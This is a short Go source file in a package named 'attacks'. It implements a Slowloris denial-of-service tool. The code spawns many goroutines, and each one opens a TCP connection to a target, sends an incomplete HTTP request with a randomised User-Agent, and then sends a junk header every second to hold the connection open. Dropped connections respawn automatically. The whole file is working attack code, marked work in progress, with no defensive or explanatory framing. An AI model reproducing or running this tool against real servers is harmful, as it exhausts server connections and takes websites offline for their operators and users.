package attacks

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/brianvoe/gofakeit/v6"
)

// WIP
func Slowloris(url string, g int) {
	for i := 0; i < g; i++ {
		go spawnSlowloris(url)
	}
}

func spawnSlowloris(url string) {
	conn, err := net.Dial("tcp", url)

	if err != nil {
		log.Println(err)
		return
	}

	_, err = conn.Write([]byte("GET / HTTP/1.1\r\n"))

	if err != nil {
		log.Println(err)
		return
	}

	_, err = conn.Write([]byte("User-Agent: " + gofakeit.UserAgent() + "\r\n"))

	if err != nil {
		log.Println(err)
		return
	}

	for {
		time.Sleep(time.Second * 1)

		header := fmt.Sprintf("%s: %s", gofakeit.Word(), gofakeit.Word())

		_, err := conn.Write([]byte(header + "\r\n"))

		if err != nil {
			go spawnSlowloris(url)
			conn.Close()
			return
		}
	}
}
